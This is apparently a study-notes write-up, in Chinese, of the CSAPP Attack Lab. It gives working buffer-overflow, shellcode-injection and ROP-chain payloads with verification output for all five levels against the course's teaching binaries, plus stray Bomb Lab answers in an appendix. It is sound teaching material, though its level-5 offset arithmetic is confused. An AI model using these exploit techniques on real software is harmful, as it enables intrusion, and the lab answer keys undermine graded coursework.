---
{"dg-publish":true,"permalink":"/knowledge/course/csapp-labs/03-Attack-Lab/","title":"CSAPP Lab3 · Attack Lab","tags":["CSAPP","LAB","实验","缓冲区溢出","ROP","汇编"],"dg-note-properties":{"title":"CSAPP Lab3 · Attack Lab","tags":["CSAPP","LAB","实验","缓冲区溢出","ROP","汇编"]}}
---


# Attack Lab

利用缓冲区溢出攻击两个有漏洞的程序。`ctarget` 用**代码注入**（栈可执行），`rtarget` 用 **ROP**（栈不可执行，只能拼已有代码片段）。

本实例的 cookie 是 `0x59b997fa`（见 `cookie.txt`）。

| # | 程序 | 目标 | 手段 |
| ---: | --- | --- | --- |
| 1 | `ctarget` | 跳到 `touch1` | 覆盖返回地址 |
| 2 | `ctarget` | `touch2(cookie)` | 注入 shellcode 设参数 |
| 3 | `ctarget` | `touch3("59b997fa")` | 注入 shellcode 传字符串指针 |
| 4 | `rtarget` | `touch2(cookie)` | ROP：`pop rdi; ret` |
| 5 | `rtarget` | `touch3("59b997fa")` | ROP：多段 gadget 算地址 |

## 关键地址

先摸清程序布局：

```bash
objdump -d ctarget | grep -E "<(getbuf|touch[123]|hexmatch)>:"
```

```text
00000000004017a8 <getbuf>:
00000000004017c0 <touch1>:
00000000004017ec <touch2>:
000000000040184c <hexmatch>:
00000000004018fa <touch3>:
```

`getbuf` 的栈布局：

```bash
objdump -d ctarget --disassemble=getbuf
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp        # 分配 40 字节缓冲区
  4017ac:	48 89 e7             	mov    %rsp,%rdi         # 缓冲区地址作为第一参数
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>     # 读入不限长度的字符串
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret                      # 从栈上取返回地址
```

**关键点**：`Gets` 不做长度检查，缓冲区只有 40 字节，写超 40 字节就覆盖返回地址。

栈帧结构：

```text
低地址  ┌──────────────────┐
        │  缓冲区 40 字节    │  ← %rsp
        ├──────────────────┤
        │  保存的 %rbx 等    │  （这里没有 push，紧邻返回地址）
        ├──────────────────┤
        │   返回地址 (8B)    │  ← 偏移 40
高地址  └──────────────────┘
```

**取缓冲区的真实地址**

在 `sub $0x28,%rsp` **之后**下断点才能拿到正确地址：

```bash
gdb -batch -q ./ctarget -ex 'b *0x4017af' -ex 'run -q -i /tmp/empty.txt' -ex 'p/x $rsp'
```

```text
$1 = 0x5561dc78
```

> 注意：如果断点设在函数入口 `0x4017a8`，读到的是 `0x5561dca0`，相差 40 字节——这是常见的踩坑点。

---

## 1. 跳到 touch1

**目标**：让 `getbuf` 返回时跳到 `touch1`（`0x4017c0`）。

**分析**

不需要执行任何自己的代码，只要把返回地址改掉。布局：

```text
偏移 0-39    40 字节填充
偏移 40-47   0x4017c0（touch1 地址，小端）
```

**构造**

```python
import struct
payload  = b'A' * 40
payload += struct.pack('<Q', 0x4017c0)
```

`hex2raw` 需要的是**十六进制文本**（每字节两位，空格分隔），不能直接喂原始字节：

```bash
python3 -c "print('41 '*40 + 'c0 17 40 00 00 00 00 00')" > /tmp/l1.hex
cat /tmp/l1.hex
```

```text
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 c0 17 40 00 00 00 00 00
```

**验证**

```bash
./hex2raw < /tmp/l1.hex > /tmp/l1.raw
./ctarget -q -i /tmp/l1.raw
```

```text
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:41 41 41 ... C0 17 40 00 00 00 00 00
```

**要点**

`touch1` 不需要参数，所以直接覆盖返回地址即可。这是最简单的"控制流劫持"，还没用到代码注入。

---

## 2. 调用 touch2(cookie)

**目标**：执行 `touch2`，且第一参数 `%rdi == cookie`。

```bash
objdump -d ctarget --disassemble=touch2
```

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  ...
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi   # 与 cookie 比较
  401802:	75 20                	jne    401824 <touch2+0x38>  # 不等则失败
```

**分析**

返回地址只能指向"某个已有函数的入口"，没法直接传参。所以要**在栈上写一小段机器码**（shellcode），让返回地址指向它：

```text
mov $cookie, %rdi     48 c7 c7 fa 97 b9 59
push $touch2          68 ec 17 40 00
ret                   c3
```

`push 立即数; ret` 等价于 `jmp`，而且比 `mov $addr,%rax; jmp *%rax` 更短。

**构造**

```python
import struct
cookie = 0x59b997fa
buf    = 0x5561dc78          # getbuf 缓冲区实际地址

sc  = b'\x48\xc7\xc7' + struct.pack('<I', cookie)   # mov $cookie, %rdi
sc += b'\x68' + struct.pack('<I', 0x4017ec)          # push $touch2
sc += b'\xc3'                                        # ret

payload  = sc + b'\x90' * (40 - len(sc))             # shellcode + NOP 填充
payload += struct.pack('<Q', buf)                    # 返回地址指向 shellcode 开头
```

shellcode 共 13 字节：

```text
48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3
```

**验证**

```bash
./hex2raw < /tmp/l2.hex > /tmp/l2.raw
./ctarget -q -i /tmp/l2.raw
```

```text
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS
```

**踩坑记录**

第一版把缓冲区地址写成 `0x5561dca0`（函数入口处的 `%rsp`），结果炸了。真实缓冲区地址是 `%rsp - 0x28 = 0x5561dc78`。**断点位置决定你读到的是哪个 `%rsp`**。

---

## 3. 调用 touch3("59b997fa")

**目标**：执行 `touch3`，第一参数 `%rdi` 指向字符串 `"59b997fa"`。

```bash
objdump -d ctarget --disassemble=touch3
```

```asm
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx          # 保存字符串指针
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)  # vlevel = 3
  401908:	48 89 fe             	mov    %rdi,%rsi          # 第二参数 = 字符串
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi # 第一参数 = cookie
  401911:	e8 36 ff ff ff       	call   40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax          # 返回非 0 才算匹配
  401918:	74 23                	je     40193d <touch3+0x43>
```

`hexmatch` 会把 cookie 转成十六进制字符串，再与你传入的字符串用 `strncmp` 比较。

**分析**

比第 2 关多一层：不能只传一个数值，还要让 `%rdi` 指向**内存里的字符串**。

难点在于：字符串必须放在一个**不会被覆盖**的位置。`hexmatch` 内部有 `add $0xffffffffffffff80,%rsp`（分配 128 字节栈空间），会把缓冲区上方一大片区域冲掉。

**失败尝试（作为反面案例）**

第一版把字符串紧跟在 shellcode 后面，放在缓冲区偏移 16 处：

```text
[shellcode 16B] [字符串 9B] [NOP 15B] [返回地址 8B]
                 ↑ 字符串在缓冲区内部
```

结果 FAIL。因为 `hexmatch` 的栈帧向下增长，压下来的 128 字节正好覆盖了缓冲区上半部分，字符串被冲毁。

**正确做法：把字符串放到返回地址槽之后**

```text
偏移 0-15     shellcode
偏移 16-39    NOP 填充
偏移 40-47    返回地址 → shellcode 开头
偏移 48-56    字符串 "59b997fa\0"   ← 高地址，安全
```

返回地址槽之后属于调用者的栈帧，`hexmatch` 压栈碰不到。

**构造**

```python
import struct
buf    = 0x5561dc78
s_addr = buf + 48                    # 字符串放在返回地址之后

sc  = b'\x48\xbf' + struct.pack('<Q', s_addr)   # mov $s_addr, %rdi（10 字节）
sc += b'\x68' + struct.pack('<I', 0x4018fa)      # push $touch3（5 字节）
sc += b'\xc3'                                    # ret（1 字节）
# sc 共 16 字节

payload  = sc + b'\x90' * (40 - len(sc))
payload += struct.pack('<Q', buf)                # 返回地址
payload += b'59b997fa\x00'                       # 字符串
```

`mov $imm64, %rdi` 用 `48 BF` 开头（`movabs`），可直接装 64 位地址，比 `push 地址; pop %rdi` 更短。

**验证**

```bash
./hex2raw < /tmp/l3.hex > /tmp/l3.raw
./ctarget -q -i /tmp/l3.raw
```

```text
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS
```

**要点**

字符串位置是这关的核心。判断标准很简单：**放在缓冲区内部一定会被 `hexmatch` 的栈帧覆盖**，必须放到返回地址之后（更高地址）。

---

## 4. ROP：调用 touch2(cookie)

**目标**：和任务 2 一样，但 `rtarget` 的栈**不可执行**，注入了也跑不起来。

**分析**

`rtarget` 开启了栈保护，只能复用程序里已有的代码片段（gadget）。每个 gadget 以 `ret` 结尾，串成链：

```text
返回地址 → gadget1 → 数据 → gadget2 → 数据 → ... → 目标函数
```

要设 `%rdi`，需要一个 `pop %rdi; ret` 的 gadget。

**找 gadget**

把 `.text` 段完整扫一遍，搜字节序列 `5f c3`：

```python
import subprocess, re
out = subprocess.run(['objdump','-s','-j','.text','rtarget'], capture_output=True, text=True).stdout
data = {}
for ln in out.splitlines():
    m = re.match(r'\s+([0-9a-f]+)\s+((?:[0-9a-f]{8}\s+){1,4})', ln)
    if m:
        data[int(m.group(1),16)] = bytes.fromhex(''.join(m.group(2).split()))

blob, base = b'', min(data)
for a in sorted(data):
    gap = a - (base + len(blob))
    if gap > 0: blob += b'\x00' * gap
    blob += data[a]

def find(pat, name):
    hits, i = [], 0
    while True:
        i = blob.find(pat, i)
        if i < 0: break
        hits.append(base + i); i += 1
    print(f'{name:20} {pat.hex():10} -> ' + ', '.join(hex(h) for h in hits[:4]))
```

```text
pop rdi; ret         5fc3       -> 0x40141b, 0x402b19
pop rsi; ret         5ec3       -> 0x401383
mov rax,rdi; ret     4889c7c3   -> 0x4019a2
mov rsp,rax; ret     4889e0c3   -> 0x401a06
```

注意 gadget 常常是**指令中间的字节**，不是完整函数开头：

```bash
objdump -d rtarget --start-address=0x401418 --stop-address=0x401420
```

```asm
0000000000401418 <scramble+0x90>:
  401418:	c8 69 c0 5f          	enter  $0xc069,$0x5f
  40141c:	c3                   	ret
```

从 `0x40141b` 开始读就是 `5f c3` —— `pop %rdi; ret`。

**构造**

```python
import struct
P = lambda a: struct.pack('<Q', a)
cookie = 0x59b997fa

payload  = b'A' * 40
payload += P(0x40141b)      # pop rdi; ret
payload += P(cookie)        # → %rdi
payload += P(0x401990)      # ret（栈对齐用）
payload += P(0x4017ec)      # touch2
```

**为什么需要额外的 `ret`**

第一版没有那个 `ret`，结果：

```text
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
Ouch!: You caused a segmentation fault!
FAIL
```

`touch2` **确实被正确调用了**，但在里面崩溃。原因是 **System V ABI 要求调用函数时 `%rsp` 必须 16 字节对齐**，而 `movaps` 之类的 SSE 指令对未对齐地址会直接段错误。

`getbuf` 的 `sub $0x28`（40 字节）不改变 16 字节对齐状态，`ret` 弹出 8 字节后 `%rsp` 变成"16n+8"，进 `touch2` 时就不对齐了。中间插一个 `ret` gadget 多吃 8 字节，恢复对齐。

**验证**

```bash
./hex2raw < /tmp/l4b.hex > /tmp/l4b.raw
./rtarget -q -i /tmp/l4b.raw
```

```text
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS
```

**要点**

栈对齐问题在 ROP 里极常见。判断方法：**如果函数明显被正确调用了却段错误**，先怀疑对齐，插 `ret` 试试。

---

## 5. ROP：调用 touch3("59b997fa")

**目标**：和任务 3 一样，但要用 gadget 拼出字符串地址。

**分析**

这一关最麻烦：**字符串放在栈上，但 ROP 链没办法事先知道它的绝对地址**（ASLR 下每次运行都不同），也不能用 `mov $imm64, %rdi` 这种注入代码。

解法是**动态计算**：先取当前 `%rsp`，再加上固定偏移，得到字符串地址。

需要一个能做加法的 gadget。扫描发现没有 `add rax, rsi; ret`，但有：

```text
lea (%rdi,%rsi,1), %rax ; ret    488d0437c3   -> 0x4019d6
```

所以思路是：**把两个数分别放进 `%rdi` 和 `%rsi`，用 `lea` 相加**。

**可用 gadget 清单**

```text
0x401a06  48 89 e0 c3        mov %rsp, %rax ; ret
0x4019a2  48 89 c7 c3        mov %rax, %rdi ; ret
0x4019ab  58 90 c3           pop %rax ; nop ; ret
0x4019dd  89 c2 90 c3        mov %eax, %edx ; nop ; ret
0x401a34  89 d1 38 c9 c3     mov %edx, %ecx ; cmp %cl,%cl ; ret
0x401a13  89 ce 90 90 c3     mov %ecx, %esi ; nop ; nop ; ret
0x4019d6  48 8d 04 37 c3     lea (%rdi,%rsi,1), %rax ; ret
```

**寄存器搬运链条**

32 位寄存器之间的搬运 gadget 很齐全，但没有 `pop rsi` 之外直接设 `%rsi` 的办法（`pop rsi; ret` 在 `0x401383`，但这里反而需要经过 `%rax→%edx→%ecx→%esi` 这条链，因为要送的是常量 72 而不是栈上的值……见下）。

实际构造：

```text
rax = rsp              (mov %rsp,%rax)      rax = buf+48
rdi = rax              (mov %rax,%rdi)      rdi = buf+48
rax = 72               (pop %rax)
edx = eax              (mov %eax,%edx)
ecx = edx              (mov %edx,%ecx)
esi = ecx              (mov %ecx,%esi)      rsi = 72
rax = rdi + rsi        (lea)                rax = buf+120
rdi = rax              (mov %rax,%rdi)      rdi = buf+120
→ touch3
```

字符串放在 offset 120，正好是 `buf + 48 + 72`。

**构造**

```python
import struct
P = lambda a: struct.pack('<Q', a)

MOV_RSP_RAX = 0x401a06
MOV_RAX_RDI = 0x4019a2
POP_RAX     = 0x4019ab
MOV_EAX_EDX = 0x4019dd
MOV_EDX_ECX = 0x401a34
MOV_ECX_ESI = 0x401a13
LEA_RDI_RSI = 0x4019d6
TOUCH3      = 0x4018fa

payload  = b'\x90' * 40
payload += P(MOV_RSP_RAX)    # rax = rsp = buf+48
payload += P(MOV_RAX_RDI)    # rdi = buf+48
payload += P(POP_RAX)
payload += P(0x48)           # rax = 72
payload += P(MOV_EAX_EDX)
payload += P(MOV_EDX_ECX)
payload += P(MOV_ECX_ESI)    # rsi = 72
payload += P(LEA_RDI_RSI)    # rax = rdi + rsi = buf+120
payload += P(MOV_RAX_RDI)
payload += P(TOUCH3)
payload += b'59b997fa\x00'   # 位于 offset 120
```

每段 8 字节：40 + 9×8 + 9 = 129 字节，字符串起始偏移 `40 + 72 = 112`… 但实际是 `48 + 72 = 120`。

> 计算细节：`%rsp` 在执行第一个 gadget 时指向 `buf+48`（返回地址槽之后），所以 `rdi = buf+48`，加 72 得 `buf+120`。而 9 个 gadget 地址占 `40+9×8 = 112` 到 `120`，字符串正好从 120 开始。

**验证**

```bash
./hex2raw < /tmp/l5.hex > /tmp/l5.raw
./rtarget -q -i /tmp/l5.raw
```

```text
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	result	1:PASS:0xffffffff:rtarget:3:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 06 1A 40 00 ... FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

**要点**

- **不能用绝对地址**：ASLR 下栈地址每次不同，必须运行时从 `%rsp` 算
- **没有 `add` 就用 `lea`**：`lea (%rdi,%rsi,1),%rax` 是变通方案
- **寄存器搬运要凑齐链条**：`pop rax` 之后要经过 `edx→ecx→esi` 才能到 `%rsi`
- **偏移要算准**：`buf+48` 是所有 gadget 地址的起点，字符串放在最后

---

## 全部验证

```bash
for i in 1 2 3; do ./ctarget -q -i /tmp/l$i.raw | grep -oE "PASS|FAIL"; done
./rtarget -q -i /tmp/l4b.raw | grep -oE "PASS|FAIL"
./rtarget -q -i /tmp/l5.raw  | grep -oE "PASS|FAIL"
```

```text
PASS      # level 1  ctarget
PASS      # level 2  ctarget
PASS      # level 3  ctarget
PASS      # level 4  rtarget
PASS      # level 5  rtarget
```

五关全部通过。

---

## 常用命令

**反汇编**

```bash
objdump -d ctarget                             # 全部反汇编
objdump -d ctarget --disassemble=getbuf        # 只看某函数
objdump -d rtarget --start-address=0x401418 --stop-address=0x401420   # 看指定区间
```

**读原始字节（找 gadget 必用）**

```bash
objdump -s -j .text rtarget | head -40         # 十六进制 dump
```

用 Python 解析更快：

```python
import subprocess, re
out = subprocess.run(['objdump','-s','-j','.text','rtarget'], capture_output=True, text=True).stdout
data = {}
for ln in out.splitlines():
    m = re.match(r'\s+([0-9a-f]+)\s+((?:[0-9a-f]{8}\s+){1,4})', ln)
    if m:
        data[int(m.group(1),16)] = bytes.fromhex(''.join(m.group(2).split()))
blob, base = b'', min(data)
for a in sorted(data):
    gap = a - (base + len(blob))
    if gap > 0: blob += b'\x00' * gap
    blob += data[a]

# 搜 gadget
i = blob.find(b'\x5f\xc3')          # pop rdi; ret
while i >= 0:
    print(hex(base + i))
    i = blob.find(b'\x5f\xc3', i + 1)
```

**生成 payload**

```bash
python3 -c "print('41 '*40 + 'c0 17 40 00 00 00 00 00')" > exploit.hex
./hex2raw < exploit.hex > exploit.raw
./ctarget -q -i exploit.raw
```

`hex2raw` 输入必须是**空格分隔的十六进制文本**，不是原始二进制。

**gdb 调试**

```bash
gdb -batch -q ./ctarget \
  -ex 'b *0x4017af' \
  -ex 'run -q -i /tmp/empty.txt' \
  -ex 'p/x $rsp' \
  -ex 'x/8gx $rsp'
```

---

## 解题套路

1. **先 `objdump -d --disassemble=getbuf`** —— 确认缓冲区大小（`sub $0xNN,%rsp` 的立即数）和返回地址偏移
2. **gdb 在 `sub` 之后下断点取 `%rsp`** —— 这才是缓冲区真实地址，函数入口处的 `%rsp` 差一个帧大小
3. **注入关（1-3）**：shellcode 尽量短，用 `push 立即数; ret` 跳转；字符串**必须放在返回地址之后**
4. **ROP 关（4-5）**：先花时间扫 gadget，把能用的清单列出来，再设计链条
5. **段错误但目标函数明显被调用了** → 先查栈对齐，插一个 `ret` gadget
6. **需要算地址时**，从 `%rsp` 起步用 `lea` 或 `add` gadget，绝不写死绝对地址

---

## 附录：环境与踩坑

### `hex2raw` 只接受十六进制文本

```bash
# 错：直接写二进制
python3 -c "open('/tmp/l1.txt','wb').write(b'A'*40)" 
./hex2raw < /tmp/l1.txt
```
```text
Invalid hex value [AAAAAAAA...]. Please specify only single byte hex values separated by whitespace.
```

```bash
# 对：空格分隔的两位十六进制
python3 -c "print('41 '*40 + 'c0 17 40 00 00 00 00 00')" > l1.hex
./hex2raw < l1.hex > l1.raw
```

### `-q` 一定要加

```bash
./ctarget -q -i exploit.raw
./rtarget -q -i exploit.raw
```

不加会尝试连评分服务器，浪费十几秒然后超时。

### 缓冲区地址：断点位置差 40 字节

这是本次最耗时的坑。

```bash
# 错：函数入口，%rsp 还没减
gdb -batch -q ./ctarget -ex 'b getbuf' -ex 'run -q -i empty.txt' -ex 'p/x $rsp'
```
```text
$1 = 0x5561dca0
```

```bash
# 对：sub $0x28,%rsp 执行之后
gdb -batch -q ./ctarget -ex 'b *0x4017af' -ex 'run -q -i empty.txt' -ex 'p/x $rsp'
```
```text
$1 = 0x5561dc78
```

`0x5561dca0 - 0x5561dc78 = 0x28 = 40`。用错地址做返回地址，程序跳到缓冲区之外，直接 `Ouch!: You caused a segmentation fault!`。

**判断方法**：`p/x $rsp` 之后对比 `sub $0xNN,%rsp` 的立即数，确认已经扣过。

### 字符串位置：必须在返回地址之后

任务 3 第一版把 `"59b997fa"` 紧跟在 shellcode 后面（缓冲区偏移 16 处）：

```text
[shellcode 16B][字符串 9B][NOP 15B][返回地址]
                ↑ 在缓冲区内部
```

结果 FAIL。原因：`hexmatch` 内部有：

```asm
401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
```

一次性压栈 128 字节，正好把缓冲区上半部分覆盖掉，字符串被冲毁。

**正确布局**：

```text
偏移 0-15     shellcode
偏移 16-39    NOP
偏移 40-47    返回地址 → shellcode 开头
偏移 48-56    字符串（高地址，安全）
```

返回地址槽之后属于调用者栈帧，`hexmatch` 压栈碰不到。

### ROP 第 4 关：函数被正确调用却段错误

现象很迷惑：

```text
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
Ouch!: You caused a segmentation fault!
FAIL
```

目标函数**确实执行成功了**，之后才崩。原因是 **System V ABI 要求调用函数时 `%rsp` 16 字节对齐**，`movaps` 这类 SSE 指令遇到未对齐地址直接 SIGSEGV。

`getbuf` 的 `sub $0x28`（40 字节）不改变 16 对齐状态，`ret` 弹出 8 字节后 `%rsp` 变成 `16n+8`，进 `touch2` 时就不对齐。

**解决办法**：中间插一个只有 `ret` 的 gadget，多吃 8 字节恢复对齐。

```python
payload += P(0x40141b)      # pop rdi; ret
payload += P(cookie)
payload += P(0x401990)      # ret  ← 就这一行，栈对齐
payload += P(0x4017ec)      # touch2
```

加了就从 FAIL 变 PASS。**这类问题以后遇到"函数明明被调用了却崩"，先怀疑对齐。**

### 找 gadget 要看指令中间的字节

`pop rdi; ret` 的字节序列 `5f c3` 在 `0x40141b`，但那个地址**不是任何函数的开头**：

```bash
objdump -d rtarget --start-address=0x401418 --stop-address=0x401420
```
```asm
0000000000401418 <scramble+0x90>:
  401418:	c8 69 c0 5f          	enter  $0xc069,$0x5f
  40141c:	c3                   	ret
```

从 `0x40141b` 开始读就是 `5f c3`。x86 是变长指令集，**任意字节偏移都能成为合法指令起点** —— 这就是 ROP 的基础。

**扫 gadget 的正确方法**：把 `.text` 整段 dump 成字节流，用 `find` 搜序列，而不是靠 `objdump -d` 的输出（它只按合法指令边界反汇编，会漏掉所有错位 gadget）。

### 第 5 关：没有现成的加法 gadget

想要 `rax = rdi + rsi`，但全扫下来没有 `add rax,rsi; ret`。可用的只有：

```text
0x4019d6  48 8d 04 37 c3   lea (%rdi,%rsi,1), %rax ; ret
```

`lea` 在这里当加法用 —— 它算地址但**不访问内存**，效果等价于 `rax = rdi + rsi`。

**寄存器搬运链条**也绕：

```text
pop rax        → rax = 72
mov eax,edx    → edx = 72
mov edx,ecx    → ecx = 72
mov ecx,esi    → esi = 72
```

没有直接的 `mov eax,esi`，只能通过 `edx → ecx → esi` 三级接力。

### 偏移计算容易算错

第 5 关的字符串位置：

```text
第一个 gadget 执行时 %rsp = buf + 48
rdi 设为 buf + 48
加 72 → buf + 120
```

而 9 个 gadget 地址占 `40 + 9×8 = 112` 字节，从 offset 40 到 152 —— 字符串不能放 112，因为那是最后一个 gadget 地址的中间。

**验证方法**：算完偏移后在 payload 里数一遍字节，或者用 `gdb` 在 `touch3` 断点处 `x/s $rdi` 看读到什么。

### `gdb -batch` 下断点不触发

如果输入提前炸了（比如只给了第 4 关的输入，前面几关都是错的），断点根本走不到。测试单个关卡时要把前面所有关的正确答案都带上：

```bash
cat > all4.txt <<'EOF'
Border relations with Canada have never been better.
1 2 4 8 16 32
0 207
7 0
EOF
gdb -batch -q ./bomb -ex 'b func4' -ex 'run < all4.txt' -ex 'info registers rdi rsi rdx'
```
```text
rdi            0x7                 7
rsi            0x0                 0
rdx            0xe                 14
```

### 五关分开验证再合并

`ctarget` 和 `rtarget` 是两个独立程序，各管几关：

```bash
for i in 1 2 3; do
  printf "L%s: " $i
  ./ctarget -q -i /tmp/l$i.raw 2>&1 | grep -oE "PASS|FAIL" | head -1
done
printf "L4: "; ./rtarget -q -i /tmp/l4b.raw 2>&1 | grep -oE "PASS|FAIL" | head -1
printf "L5: "; ./rtarget -q -i /tmp/l5.raw  2>&1 | grep -oE "PASS|FAIL" | head -1
```
```text
L1: PASS
L2: PASS
L3: PASS
L4: PASS
L5: PASS
```

一次改一关，别攒着最后一起测 —— 失败时无法定位是哪一关的问题。
